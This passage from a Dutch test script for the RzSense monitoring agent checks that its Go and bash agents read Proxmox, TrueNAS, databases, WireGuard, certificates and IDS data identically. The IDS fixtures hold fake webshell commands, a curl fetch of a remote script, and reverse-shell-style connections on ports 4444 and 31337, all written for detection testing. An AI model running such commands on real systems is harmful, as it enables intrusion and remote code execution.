    bad.append('inhoud van het alarm: %s' % json.dumps(po[0], ensure_ascii=False))
nt = rows('ntfy-b')
if nt and (nt[0]['auth'] != 'Bearer ntfy-token-test' or nt[0]['fields']['priority'] != 5 or nt[0]['fields']['topic'] != 'waakhond_test'):
    bad.append('ntfy: %s' % json.dumps(nt[0], ensure_ascii=False))
ga, gg = [re.sub(r'[0-9]{6,}', 'T', open('%s/%s/watchdog.gap' % (W, d)).read()) for d in 'bg']
sa, sg = [open('%s/%s/watchdog' % (W, d)).read() for d in 'bg']
if ga != gg or sa != sg or '"sent":1' not in ga:
    bad.append('notitie of stand: bash %r %r, go %r %r' % (ga, sa, gg, sg))
if bad:
    print('\n'.join(bad)); sys.exit(1)
print('✔ de waakhond: %d berichten via Pushover en %d via ntfy (alarm na 5 minuten, één keer, herstelbericht, cron stil en weer terug) en de notitie voor RzSense: gelijk aan de bash-agent' % (len(po), len(nt)))
PY
kill "$wd_srv" 2>/dev/null || true

# 1.354.0 (Go-agent 0.23.0): Proxmox en TrueNAS: de echte bash-code en de Go-agent met dezelfde namaak-pvesh, -pvesm,
# -zpool en -midclt (vaste uitvoer; er wordt alleen gelezen)
P="$work/pve"
mkdir -p "$P/bin" "$P/bt" "$P/gd"
cat >"$P/bin/pvesh" <<'EOS'
#!/bin/sh
case "$2" in
    */qemu) echo '[{"vmid":100,"name":"web","status":"running","cpu":0.02,"cpus":2,"mem":1073741824,"maxmem":2147483648,"uptime":86400},{"vmid":101,"name":"db \"prod\"","status":"stopped","template":0}]' ;;
    */lxc) echo '[{"vmid":"200","name":"dns","status":"running","maxdisk":8589934592}]' ;;
    */storage) echo '[{"storage":"local","type":"dir","active":1,"total":100,"used":40},{"storage":"pbs","type":"pbs","active":1}]' ;;
    /cluster/status) echo '[{"type":"cluster","name":"thuis","quorate":1,"nodes":2}]' ;;
    /cluster/backup) echo '[{"id":"backup-1","enabled":1,"vmid":"100,200","schedule":"02:00","storage":"pbs"}]' ;;
    */tasks) echo '[{"upid":"UPID:x","type":"vzdump","status":"OK","starttime":1795000000,"endtime":1795000600,"id":"100"}]' ;;
    *) echo 'geen json'; exit 1 ;;
esac
EOS
printf '#!/bin/sh\necho "pve-manager/8.3.1/abc (running kernel: 6.8.12-4-pve)"\necho tweede\n' >"$P/bin/pveversion"
cat >"$P/bin/pvesm" <<'EOS'
#!/bin/sh
case "$1 $2" in
    "status --content") printf 'Name  Type  Status  Total  Used  Available  %%\nlocal dir active 100 40 60 40.00%%\npbs pbs active 500 100 400 20.00%%\nuit dir disabled 0 0 0 N/A\n' ;;
    "list local") printf 'Volid Format Type Size VMID\nlocal:backup/vzdump-qemu-100-2026_11_19-02_00_01.vma.zst vma.zst backup 123 100\nlocal:backup/vzdump-qemu-100-2026_11_20-02_00_05.vma.zst vma.zst backup 124 100\nlocal:backup/vzdump-lxc-200-2026_11_18-02_10_00.tar.zst tar.zst backup 50 200\nlocal:backup/raar-bestand.txt txt backup 1 x\n' ;;
    "list pbs") printf 'Volid Format Type Size VMID\npbs:backup/vm/100/2026-11-21T03:00:00Z pbs-vm backup 456 100\npbs:backup/ct/200/2026-11-17T03:00:00Z pbs-ct backup 78 200\n' ;;
esac
EOS
cat >"$P/bin/zpool" <<'EOS'
#!/bin/sh
case "$1" in
    list) printf 'rpool\tONLINE\t499558383616\t120259084288\t24\ntank\tDEGRADED\t1000000000000\t900000000000\t90\n' ;;
    status) if [ "$2" = rpool ]; then printf '  pool: rpool\n state: ONLINE\n  scan: scrub repaired 0B in 00:03:12 with 0 errors on Sun Nov  8 00:27:13 2026\nconfig:\n'; else printf '  pool: tank\n state: DEGRADED\n'; fi ;;
esac
EOS
cat >"$P/bin/midclt" <<'EOS'
#!/bin/sh
case "$2" in
    alert.list) echo '[{"id":"a1","level":"WARNING","formatted":"Pool tank is 90% vol","dismissed":false}]' ;;
    replication.query) echo '[{"id":1,"name":"naar-backup","enabled":true,"state":{"state":"FINISHED"}}]' ;;
    pool.snapshottask.query) echo '[]' ;;
    cloudsync.query) echo '[{"id":2,"description":"b2","enabled":true,"job":{"state":"FAILED"}}]' ;;
    rsynctask.query) echo 'Traceback: fout' ; exit 1 ;;
    app.query) echo '[{"name":"jellyfin","state":"RUNNING","upgrade_available":true,"version":"1.2.3"},{"name":"oud","state":"STOPPED","upgrade_available":false,"version":"0.9"}]' ;;
    disk.temperatures) echo '{"sda":34,"sdb":41,"nvme0n1":null}' ;;
    update.status) exit 1 ;;
    update.check_available) echo '{"status":"AVAILABLE","version":"25.04.2"}' ;;
esac
EOS
chmod 755 "$P/bin/"*
(
    PATH="$P/bin:$PATH"; t_dir="$P/bt"; HA_MODE=0
    id() { if [ "${1-}" = -u ] && [ $# = 1 ]; then echo 0; else command id "$@"; fi; }
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^due_cached() {/,/^}/p' agent/src/40-basis-meten.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^pve_json=""/,$p' agent/src/70-containers-en-proxmox.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^truenas_json=""/,$p' agent/src/72-truenas.sh)
    printf '{"pve":%s,"truenas":%s}' "${pve_json:-null}" "${truenas_json:-null}" >"$P/bash.json"
) || fail "de bash-code voor Proxmox en TrueNAS faalde"
PATH="$P/bin:$PATH" RZSENSE_DATA="$P/gd" "$work/rzsense" collect >"$P/go.json" || fail "de Go-agent kon Proxmox en TrueNAS niet lezen"
python3 -I - "$P/bash.json" "$P/go.json" <<'PY' || fail "de Go-agent leest Proxmox of TrueNAS anders dan de bash-agent"
import json, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
for part in ('pve', 'truenas'):
    x, y = a[part], g[part]
    if not x or not y:
        bad.append('%s ontbreekt: bash %s, go %s' % (part, bool(x), bool(y))); continue
    for k in sorted((set(x) | set(y)) - {'at'}):
        if x.get(k) != y.get(k):
            bad.append('%s.%s:\n bash %s\n go   %s' % (part, k, json.dumps(x.get(k), ensure_ascii=False), json.dumps(y.get(k), ensure_ascii=False)))
p = a['pve'] or {}
if bad or p.get('backups', {}).get('100') != ['2026-11-21 03:00:00Z', 3, 'pbs'] or len(p.get('zfs', [])) != 2 or a['truenas']['rsync'] is not None or a['truenas']['update']['status'] != 'AVAILABLE':
    print('\n'.join(bad) or 'onverwachte testgegevens: %s' % json.dumps(a, ensure_ascii=False)[:1500]); sys.exit(1)
print('✔ Proxmox (%d guests, opslag, %d ZFS-pools, back-ups per guest, taken) en TrueNAS (meldingen, taken, %d apps, temperaturen, update): gelijk aan de bash-agent' % (len(p['qemu']) + len(p['lxc']), len(p['zfs']), len(a['truenas']['apps'])))
PY

# 1.355.0 (Go-agent 0.24.0): databases, WireGuard en netwerkverkeer: de echte bash-code en de Go-agent met dezelfde
# namaak-clients (mariadb, psql, podman, wg). Het wachtwoord hoort via de omgeving te gaan, nooit op de opdrachtregel.
D="$work/dbt"
mkdir -p "$D/bin" "$D/bt" "$D/gd" "$D/gc"
cat >"$D/bin/mariadb" <<'EOS'
#!/bin/sh
echo "mariadb $* | pw=$( [ "$MYSQL_PWD" = "$DB_WANT_PW" ] && echo goed || { [ -z "$MYSQL_PWD" ] && echo leeg || echo anders; })" >>"$DB_LOG"
sql=$(cat)
case " $* " in *" faal "*) echo "ERROR 1045 (28000): Access denied for user 'faal'@'localhost' (using password: NO)"; exit 1 ;; esac
case "$sql" in
    *"SHOW GLOBAL STATUS"*) printf 'Uptime\t86400\nThreads_connected\t12\nThreads_running\t2\nQuestions\t123456\nSlow_queries\t3\nOnbekend_ding\t9\nMax_used_connections\t40\nv:max_connections\t151\nv:version\t10.11.6-MariaDB\nv:read_only\t0\nlongq\t12|app|shop|U0VMRUNUICogRlJPTSBvcmRlcnM=\n*************************** 1. row ***************************\n               Slave_IO_State: Waiting\n             Slave_IO_Running: Yes\n            Slave_SQL_Running: No\n        Seconds_Behind_Master: 42\n                Last_SQL_Error: Duplicate "entry" \\ x\n                  Master_Host: db1\n' ;;
    *table_schema*) printf 'size:shop\t104857600\nsize:wiki\t5242880\nrommel\t1\n' ;;
esac
EOS
cat >"$D/bin/psql" <<'EOS'
#!/bin/sh
echo "psql $* | pw=$( [ "$PGPASSWORD" = "$DB_WANT_PW" ] && echo goed || { [ -z "$PGPASSWORD" ] && echo leeg || echo anders; })" >>"$DB_LOG"
cat >/dev/null
printf 'version\t16.4\nuptime\t3600\nmax_conn\t100\nconn\t7\nactive\t1\nidle_tx\t0\nxact\t99999\nwrap_age\t1234567\nrecovery\t0\nreplicas\t1\nonbekend\t5\nsize:app\t20971520\nlongq\t33|mon|app|c2VsZWN0IDE=\n'
EOS
cat >"$D/bin/podman" <<'EOS'
#!/bin/sh
case "$1" in
    ps) echo x ;;
    exec) echo "podman $* | pw=$( [ -z "$MYSQL_PWD$PGPASSWORD" ] && echo leeg || echo gezet)" >>"$DB_LOG"; cat >/dev/null
          case " $* " in *" dbct "*) printf 'Uptime\t100\nThreads_connected\t1\nv:version\t11.4.2-MariaDB\n' ;; *" pgct "*) printf 'version\t17.0\nconn\t2\n' ;; *) echo "Error: no such container"; exit 125 ;; esac ;;
    *) exit 1 ;;
esac
EOS
cat >"$D/bin/wg" <<'EOS'
#!/bin/sh
printf 'wg0\tPRIVKEYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=\tPUBKEYyyyy=\t51820\toff\n'
printf 'wg0\tAb+Cd/EfGhIjKlMnOp=\t(none)\t203.0.113.7:51820\t10.0.0.2/32\t%s\t123456\t654321\t25\n' "$(($(date +%s) - 90))"
printf 'wg0\tZz99yyXX==\t(none)\t(none)\t10.0.0.3/32\t0\t0\t0\toff\n'
EOS
chmod 755 "$D/bin/"*
db_pw='G3heim wachtwoord!'
{
    printf '0\ttick\t60\n'
    printf '91\tdb\tmysql\tlocal\t-\t-\t-\t-\taaaaaaaaaaa1\t60\n'
    printf '92\tdb\tmysql\tlocal\t-\tapp\t%s\tshop\taaaaaaaaaaa2\t60\n' "$(printf '%s' "$db_pw" | base64 -w0)"
    printf '93\tdb\tpgsql\tlocal\t-\tmon\t%s\t-\taaaaaaaaaaa3\t60\n' "$(printf '%s' "$db_pw" | base64 -w0)"
    printf '94\tdb\tmysql\tcontainer\troot/dbct\t-\t-\t-\taaaaaaaaaaa4\t60\n'
    printf '95\tdb\tpgsql\tcontainer\troot/pgct\t-\t-\t-\taaaaaaaaaaa5\t60\n'
    printf '96\tdb\tmysql\tlocal\t-\traar;naam\t-\t-\taaaaaaaaaaa7\t60\n'
    printf '97\tdb\tmysql\tlocal\t-\tapp\t-\tshop\taaaaaaaaaaa2\t60\n'
    printf '98\tdb\tmysql\tlocal\t-\tfaal\t-\t-\taaaaaaaaaaa6\t60\n'
    printf '99\tdb\tmysql\tcontainer\t-\t-\t-\t-\taaaaaaaaaaa8\t60\n'
} >"$D/tests.cache"; cp "$D/tests.cache" "$D/gc/tests.cache"
(
    PATH="$D/bin:$PATH"; export DB_LOG="$D/log.bash" DB_WANT_PW="$db_pw"; t_dir="$D/bt"; t_cache="$D/tests.cache"; TEST=0; HA_MODE=0; podman_ctx=(root)
    id() { if [ "${1-}" = -u ] && [ $# = 1 ]; then echo 0; else command id "$@"; fi; }
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^due_cached() {/,/^}/p' agent/src/40-basis-meten.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^now_ms() {/p' agent/src/30-test-en-status.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^ctr_busy=""/,/^# Agent 1.67.0: PID van deze run/p' agent/src/40-basis-meten.sh | sed '$d')
    # shellcheck disable=SC1090
    source <(sed -n '/^pm() {/,/^}/p' agent/src/40-basis-meten.sh)
    # shellcheck disable=SC1090
    source agent/src/76-database.sh
    # shellcheck disable=SC1090
    source <(sed -n '/^wg_json=""/,/^\[ -n "\$nic_ifs" \]/p' agent/src/85-meesturen.sh)
    printf '{"db":%s,"wg":%s,"nic":%s}' "${db_json:-null}" "${wg_json:-null}" "${nic_json:-null}" >"$D/bash.json"
    printf '%s\0%s\0%s\0' "$db_my_sql" "$db_my_size" "$db_pg_sql" >"$D/sql.bash"
) || fail "de bash-code voor databases en WireGuard faalde"
PATH="$D/bin:$PATH" DB_LOG="$D/log.go" DB_WANT_PW="$db_pw" RZSENSE_BASH_CACHE="$D/gc" RZSENSE_DATA="$D/gd" "$work/rzsense" db-test check >"$D/db.go.json" || fail "de Go-agent kon de databases niet lezen"
PATH="$D/bin:$PATH" RZSENSE_DATA="$D/gd2" "$work/rzsense" collect >"$D/core.go.json" || fail "de Go-agent kon WireGuard en het netwerkverkeer niet lezen"
"$work/rzsense" db-test sql >"$D/sql.go"
cmp -s "$D/sql.bash" "$D/sql.go" || fail "de query's van de Go-agent zijn niet meer gelijk aan die van de bash-agent (agent-win/dbsql_linux.go bijwerken)"
grep -qF "$db_pw" "$D/log.bash" "$D/log.go" && fail "het databasewachtwoord stond op de opdrachtregel"
python3 -I - "$D/bash.json" "$D/db.go.json" "$D/core.go.json" "$D/log.bash" "$D/log.go" <<'PY' || fail "de Go-agent leest databases, WireGuard of netwerkverkeer anders dan de bash-agent"
import json, sys
a, gdb, gcore = [json.load(open(p)) for p in sys.argv[1:4]]
bad = []
for d in (a['db'], gdb):
    for v in d.values():
        v.pop('ms'); v.pop('at')
for k in sorted(set(a['db']) | set(gdb)):
    if a['db'].get(k) != gdb.get(k):
        bad.append('database %s:\n bash %s\n go   %s' % (k, json.dumps(a['db'].get(k), ensure_ascii=False), json.dumps(gdb.get(k), ensure_ascii=False)))
wa, wg = a['wg'], gcore['wg']
for l in (wa, wg):
    for p in l or []:
        if p['hs'] > 0: p['hs'] = 'recent' if abs(p['hs'] - 90) < 30 else p['hs']
if wa != wg:
    bad.append('wireguard:\n bash %s\n go   %s' % (json.dumps(wa), json.dumps(wg)))
na, ng = a['nic'], gcore['nic']
if (na is None) != (ng is None) or (na and (na['ifs'] != ng['ifs'] or not (na['rx'] <= ng['rx'] <= na['rx'] * 1.2 + 10000000))):
    bad.append('netwerkverkeer: bash %s, go %s' % (json.dumps(na), json.dumps(ng)))
la, lg = [open(p).read() for p in sys.argv[4:6]]
if la != lg:
    bad.append('aanroepen van de clients:\n bash\n%s go\n%s' % (la, lg))
d = a['db']
if bad or sorted(d) != ['aaaaaaaaaaa%d' % i for i in (1, 2, 3, 4, 5, 6)] or d['aaaaaaaaaaa6']['ok'] != 0 or 'Access denied' not in d['aaaaaaaaaaa6']['err'] or d['aaaaaaaaaaa1']['kv'].get('repl:Slave_SQL_Running') != 'No' \
        or 'Onbekend_ding' in d['aaaaaaaaaaa1']['kv'] or d['aaaaaaaaaaa1']['kv'].get('size:shop') != '104857600' or la.count('pw=goed') != 3 or len(wa) != 2:
    print('\n'.join(bad) or 'onverwachte testgegevens: %s\n%s' % (json.dumps(a, ensure_ascii=False)[:1500], la)); sys.exit(1)
print('✔ databases (%d verbindingen: MariaDB en PostgreSQL, lokaal en in een container, replicatie, grootte, een fout), %d WireGuard-peers en het netwerkverkeer: gelijk aan de bash-agent; het wachtwoord ging via de omgeving' % (len(d), len(wa)))
PY

# 1.356.0 (Go-agent 0.25.0): wifi, certificaten zoeken, het meetpunt van buitenaf en de diagnose: de echte bash-code en
# de Go-agent; de zelftest heeft de Go-agent in zijn eigen vorm (andere agent, andere controles)
X="$work/ex"
mkdir -p "$X/zoek/site/live" "$X/zoek/node_modules/pkg" "$X/zoek/app/tests" "$X/zoek/diep/a/b" "$X/bt" "$X/gd" "$X/gc"
cp "$work/certs/fullchain.pem" "$X/zoek/site/live/fullchain.pem"; cp "$work/certs/leaf.pem" "$X/zoek/site/cert.CRT"; cp "$work/certs/ca.pem" "$X/zoek/diep/a/b/ca.cer"
cp "$work/certs/leaf.pem" "$X/zoek/node_modules/pkg/x.pem"; cp "$work/certs/leaf.pem" "$X/zoek/app/tests/t.pem"; cp "$work/certs/leaf.key" "$X/zoek/site/privkey.pem"
cp "$work/certs/leaf.pem" "$X/zoek/site/geen-extensie"; cp "$work/certs/ca.pem" "$X/zoek/cacert.pem"; ln -s "$X/zoek/site/cert.CRT" "$X/zoek/link.pem"
for _ in $(seq 25); do cat "$work/certs/ca.pem"; done >"$X/zoek/site/bundel.pem"; printf 'geen certificaat\n' >"$X/zoek/site/leeg.crt"
IW_OUT='Connected to aa:bb:cc:dd:ee:ff (on wlan0)
	SSID: Thuis "5G" netwerk
	freq: 5500
	RX: 123456 bytes (789 packets)
	signal: -52 dBm
	rx bitrate: 866.7 MBit/s VHT-MCS 9 80MHz short GI VHT-NSS 2
	tx bitrate: 1201.0 MBit/s 80MHz HE-MCS 11 HE-NSS 2 HE-GI 0 HE-DCM 0'
printf '0\ttick\t60\n0\tcertdirs\t%s /bestaat/niet relatief\n0\tcertscan\t4\n0\texprobe\t77\t127.0.0.1\t22,80\n0\texprobe\t77\t192.168.1.1\t22\n0\texprobe\t77\t203.0.113.1\t9,7\n0\texprobe\t77\traar;ip\t1\n0\tdiag\t88\tdisk\t%s\n' "$X/zoek" "$X/zoek" >"$X/tests.cache"; cp "$X/tests.cache" "$X/gc/tests.cache"
(
    t_dir="$X/bt"; t_cache="$X/tests.cache"; export CACHE_DIRECTORY="$X/bt"; TEST=0; HA_MODE=0; COMMANDS=""; CERT_DIRS=""
    id() { if [ "${1-}" = -u ] && [ $# = 1 ]; then echo 1; else command id "$@"; fi; }   # geen root: dan ook geen dmesg
    lap() { :; }
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^cert_line() {/,/^collect_certs() {/p' agent/src/75-certificaten-processen-software.sh | sed '$d')
    # shellcheck disable=SC1090
    source <(sed -n '/^cert_found=""/,/^# -\{10,\} Processen/p' agent/src/75-certificaten-processen-software.sh | sed '$d')
    # shellcheck disable=SC1090
    source agent/src/89-buitenprobe.sh
    # shellcheck disable=SC1090
    source agent/src/87-diagnose.sh
    # shellcheck disable=SC1090
    source <(sed -n '/^wifi_parse() {/,/^}/p' agent/src/85-meesturen.sh)
    printf '{"certs":[%s],"exprobe":%s,"diag":%s,"wifi":%s}' "${cert_found%,}" "${exprobe_json:-null}" "${diag_json:-null}" "$(printf '%s\n' "$IW_OUT" | wifi_parse wlan0)" >"$X/bash.json"
) || fail "de bash-code voor certificaten zoeken, het meetpunt of de diagnose faalde"
printf 'MONITOR_URL="%s"\nCERT_DIRS=""\n' "$BASE" >"$X/conf"
go_x() { RZSENSE_BASH_CONF="$X/conf" RZSENSE_BASH_CACHE="$X/gc" RZSENSE_DATA="$X/gd" RZSENSE_TEST_ROOT=0 "$work/rzsense" extra-test "$@"; }
printf '{"certs":%s,"exprobe":%s,"diag":%s,"wifi":%s}' "$(go_x certs)" "$(go_x exprobe)" "$(go_x diag)" "$(printf '%s\n' "$IW_OUT" | go_x wifi wlan0)" >"$X/go.json"
python3 -I - "$X/bash.json" "$X/go.json" <<'PY' || fail "de Go-agent doet certificaten zoeken, het meetpunt, de diagnose of wifi anders dan de bash-agent"
import json, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
ca, cg = [sorted(d['certs'], key=lambda c: c['path']) for d in (a, g)]
if ca != cg:
    bad.append('certificaten:\n bash %s\n go   %s' % (json.dumps(ca, ensure_ascii=False), json.dumps(cg, ensure_ascii=False)))
for k in ('exprobe', 'wifi'):
    if a[k] != g[k]:
        bad.append('%s:\n bash %s\n go   %s' % (k, json.dumps(a[k], ensure_ascii=False), json.dumps(g[k], ensure_ascii=False)))
da, dg = [{i['k']: i['out'] for i in d['diag']['items']} for d in (a, g)]
dg.pop('dmesg', None); da.pop('dmesg', None)   # alleen als root (de bash-kant draait hier zonder root)
if sorted(da) != sorted(dg) or da.get('df') != dg.get('df') or da.get('du') != dg.get('du') or a['diag']['id'] != g['diag']['id']:
    bad.append('diagnose:\n bash %s\n go   %s' % (json.dumps(da, ensure_ascii=False)[:800], json.dumps(dg, ensure_ascii=False)[:800]))
names = sorted(c['path'].rsplit('/', 1)[1] for c in ca)
if bad or names != ['ca.cer', 'cert.CRT', 'fullchain.pem', 'link.pem'] or sorted(a['exprobe']['res']) != ['203.0.113.1'] or a['wifi']['std'] != 'ax' or a['wifi']['chan'] != 100 or 'df' not in da:
    print('\n'.join(bad) or 'onverwachte testgegevens: %s' % json.dumps(a, ensure_ascii=False)[:1500]); sys.exit(1)
print('✔ certificaten zoeken (%d gevonden; bundels, sleutels en testmappen overgeslagen), het meetpunt van buitenaf (alleen openbare adressen), de diagnose (%d onderdelen) en wifi: gelijk aan de bash-agent' % (len(ca), len(da)))
PY
# De zelftest van de Go-agent: één keer per vraag, met zijn eigen controles
printf '0\ttick\t60\n0\tselftest\t99\n' >"$X/gc/tests.cache"
got=$(go_x selftest | python3 -I -c 'import json,sys; d=json.load(sys.stdin); print(d["id"], " ".join(sorted(i["k"] + ":" + i["ok"] for i in d["items"] if i["k"] in ("url", "queue", "tools", "disk"))))')
[ "$got" = "99 disk:ok queue:ok tools:ok url:ok" ] || fail "de zelftest van de Go-agent gaf iets onverwachts: $got"
[ "$(go_x selftest)" = null ] || fail "de zelftest hoort maar één keer per vraag te draaien"
echo "✔ de zelftest van de Go-agent: RzSense bereikbaar, vrije ruimte en de rest; één keer per vraag"

# 1.357.0 (Go-agent 0.27.0): IDS als proef (alleen waarnemen): de echte bash-code en de Go-agent lezen dezelfde
# gevoelige bestanden (SHA-256), gebruikers, groepen, kernelmodules en verdachte processen van deze machine
I="$work/ids"; mkdir -p "$I"
# een kopie van bash als "verdacht programma" (een kopie van sleep start niet overal: op sommige systemen is dat één gezamenlijk programma)
cp "$(command -v bash)" /tmp/rzproef-ids-verdacht 2>/dev/null && (/tmp/rzproef-ids-verdacht -c 'sleep 40; :' >/dev/null 2>&1 & echo $! >"$I/pid")
sleep 0.5
(
    # shellcheck disable=SC1090
    source <(sed -n '/^json_escape() {/,/^}/p; /^json_text() {/,/^}/p' agent/src/15-realtime.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^    shopt -s nullglob$/,/^    mods_json=/p' agent/src/60-ids-en-edr.sh)
    # shellcheck disable=SC1090
    source <(sed -n '/^    procs_json=""; n_procs=0$/,/^    done$/p' agent/src/60-ids-en-edr.sh)
    printf '{"files":{%s},"users":[%s],"groups":{%s},"modules":[%s],"procs":[%s]}' "${files_json%,}" "${users_json%,}" "${groups_json%,}" "${mods_json%,}" "${procs_json%,}" >"$I/bash.json"
) || fail "de bash-code voor het IDS faalde"
"$work/rzsense" ids-obs >"$I/go.json" || fail "de Go-agent kon niet waarnemen voor het IDS"
kill "$(cat "$I/pid" 2>/dev/null)" 2>/dev/null || true; rm -f /tmp/rzproef-ids-verdacht
python3 -I - "$I/bash.json" "$I/go.json" <<'PY' || fail "de Go-agent neemt voor het IDS iets anders waar dan de bash-agent"
import json, sys
a, g = [json.load(open(p)) for p in sys.argv[1:3]]
bad = []
for k in ('files', 'users', 'groups', 'modules'):
    if a[k] != g[k]:
        x, y = a[k], g[k]
        if isinstance(x, dict):
            bad.append('%s: alleen bash %s, alleen go %s, anders %s' % (k, sorted(set(x) - set(y))[:5], sorted(set(y) - set(x))[:5], [p for p in x if p in y and x[p] != y[p]][:5]))
        else:
            bad.append('%s: bash %s\n go %s' % (k, json.dumps(x)[:400], json.dumps(y)[:400]))
pa, pg = [sorted((p['exe'], p['user']) for p in d['procs'] if 'rzproef-ids' in p['exe']) for d in (a, g)]
if pa != pg or len(pa) != 1:
    bad.append('verdachte processen: bash %s, go %s' % (json.dumps(a['procs'])[:500], json.dumps(g['procs'])[:500]))
if bad or len(a['files']) < 5 or len(a['users']) < 3:
    print('\n'.join(bad) or 'te weinig gelezen: %d bestanden, %d gebruikers' % (len(a['files']), len(a['users']))); sys.exit(1)
print('✔ IDS als proef (alleen waarnemen): %d gevoelige bestanden (SHA-256), %d gebruikers, %d groepen, %d kernelmodules en een proces uit /tmp: gelijk aan de bash-agent' % (len(a['files']), len(a['users']), len(a['groups']), len(a['modules'])))
PY

# 1.359.0 (Go-agent 0.28.0): de rest van het IDS-waarnemen: webshells, verbindingen, hardening, SUID, pakketcontrole en
# bestanden bewaken. De echte bash-code en de Go-agent krijgen dezelfde namaak-ps en -ss en dezelfde bestanden.
J="$work/ids2"; mkdir -p "$J/bin" "$J/b" "$J/gc" "$J/gd" "$J/w/etc/app/cache" "$J/w/etc/app/sub dir" "$J/w/srv" "$J/suid/usr/bin" "$J/suid/var/lib/docker/x" "$J/suid/home/piet/.local/share/containers/y"
sleep 60 & j_pid=$!
cat >"$J/ps.txt" <<EOF
    1     0 root                             systemd         /usr/lib/systemd/systemd
  700     1 root                             nginx           nginx: master process /usr/sbin/nginx
  701   700 www-data                         nginx           nginx: worker process
  702   701 www-data                         php-fpm8.2      php-fpm: pool www
$$   702 www-data                         sh              sh -c id; uname -a "x\\y"
$j_pid     1 apache                           curl            curl -s http://203.0.113.9/x.sh
  705   702 www-data                         sh              sh -c /usr/sbin/sendmail -t -i
  706     1 root                             bash            -bash
  707   706 root                             python3.11      python3.11 -m http.server
EOF
cat >"$J/ss-l.txt" <<'EOF'
LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=800,fd=3))
LISTEN 0      80           0.0.0.0:3306       0.0.0.0:*    users:(("mariadbd",pid=810,fd=20))
LISTEN 0      511                *:443              *:*    users:(("nginx",pid=700,fd=6))
LISTEN 0      4096         0.0.0.0:2375       0.0.0.0:*    users:(("dockerd",pid=820,fd=4))
LISTEN 0      128             [::]:5432          [::]:*    users:(("postgres",pid=830,fd=5))
LISTEN 0      128        127.0.0.1:6379       0.0.0.0:*    users:(("redis",pid=840,fd=5))
EOF
cat >"$J/ss-lu.txt" <<'EOF'
udp   UNCONN 0      0            0.0.0.0:69         0.0.0.0:*    users:(("tftpd",pid=850,fd=4))
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*    users:(("sshd",pid=800,fd=3))
tcp   LISTEN 0      128          0.0.0.0:23         0.0.0.0:*    users:(("telnetd",pid=860,fd=3))
tcp   LISTEN 0      128          0.0.0.0:21         0.0.0.0:*    users:(("vsftpd",pid=870,fd=3))
EOF
cat >"$J/ss-e.txt" <<'EOF'
0      0      192.168.1.10:22        192.168.1.50:51234 users:(("sshd",pid=900,fd=4),("sshd",pid=899,fd=4))
0      0      192.168.1.10:44322     203.0.113.7:443   users:(("curl",pid=910,fd=5))
0      0      192.168.1.10:44323     203.0.113.7:443   users:(("curl",pid=911,fd=5))
0      0      192.168.1.10:50000     198.51.100.3:4444  users:(("sleep",pid=920,fd=0),("bash",pid=921,fd=0))
0      0      192.168.1.10:50001     198.51.100.4:31337 users:(("evil",pid=930,fd=3))
0      0      127.0.0.1:50002        127.0.0.1:5432    users:(("php",pid=940,fd=3))
0      0      192.168.1.10:50003     10.0.0.5:5432     users:(("php",pid=941,fd=3))
0      0      192.168.1.10:50004     172.20.1.1:80     users:(("php",pid=942,fd=3))
0      0      192.168.1.10:50005     172.32.1.1:80     users:(("php",pid=943,fd=3))
0      0      [2001:db8::1]:50006    [2001:db8::99]:6667 users:(("irc bot",pid=944,fd=3))
0      0      [fd00::1]:50007        [fd00::2]:80      users:(("php",pid=945,fd=3))
0      0      192.168.1.10:443       203.0.113.50:60111 users:(("nginx",pid=701,fd=9))
0      0      192.168.1.10:50008     203.0.113.60:80
EOF
cat >"$J/bin/ps" <<EOF
#!/bin/sh
cat "$J/ps.txt"
EOF
cat >"$J/bin/ss" <<EOF
#!/bin/sh
case "\$*" in *established*) cat "$J/ss-e.txt" ;; *-Htulnp*) cat "$J/ss-lu.txt" ;; *) cat "$J/ss-l.txt" ;; esac
EOF
chmod +x "$J/bin/ps" "$J/bin/ss"
# bestanden om te bewaken: een map met uitzonderingen, een los bestand, jokertekens, een koppeling en bijzondere rechten
printf 'a=1\n' >"$J/w/etc/app/app.conf"; printf 'log\n' >"$J/w/etc/app/app.log"; printf 'c\n' >"$J/w/etc/app/cache/c.dat"
printf 'x y\n' >"$J/w/etc/app/sub dir/met spatie.txt"; printf 'weg\n' >"$J/w/etc/app/weg.txt"; printf 'los\n' >"$J/w/srv/los.bin"
printf 'een\n' >"$J/w/srv/a.pem"; printf 'twee\n' >"$J/w/srv/b.pem"; printf 'niet\n' >"$J/w/srv/c.txt"
ln -s app.conf "$J/w/etc/app/link.conf"; ln -s los.bin "$J/w/srv/los-link"
chmod 4755 "$J/w/srv/los.bin"; chmod 600 "$J/w/srv/a.pem"; chmod 1644 "$J/w/etc/app/app.conf" 2>/dev/null || true
fim_cfg=$(printf 'e\t1700000001\np\t2\t%s\np\t1\t%s\np\t1\t%s\np\t2\t%s\np\t1\t%s\nx\t*.log\nx\tcache/\nx\t%s\n' "$J/w/etc/app" "$J/w/srv/los.bin" "$J/w/srv/*.pem" "$J/w/srv/los-link" "$J/w/etc/**/app.conf" "$J/w/srv/b.pem")
printf '0\tids\tlearn\n0\tfim\t%s\n' "$(printf '%s' "$fim_cfg" | base64 -w0)" >"$J/b/tests.cache"; cp "$J/b/tests.cache" "$J/gc/tests.cache"
ids_bash() {  # ids_bash <uitvoerbestand>: de echte code van de bash-agent, met de namaak-ps en -ss
    (
        export PATH="$J/bin:$PATH"
        t_dir="$J/b"; t_cache="$J/b/tests.cache"; i_dir="$J/b/ids"; mkdir -p "$i_dir"; ids_mode=learn; ids_json=""
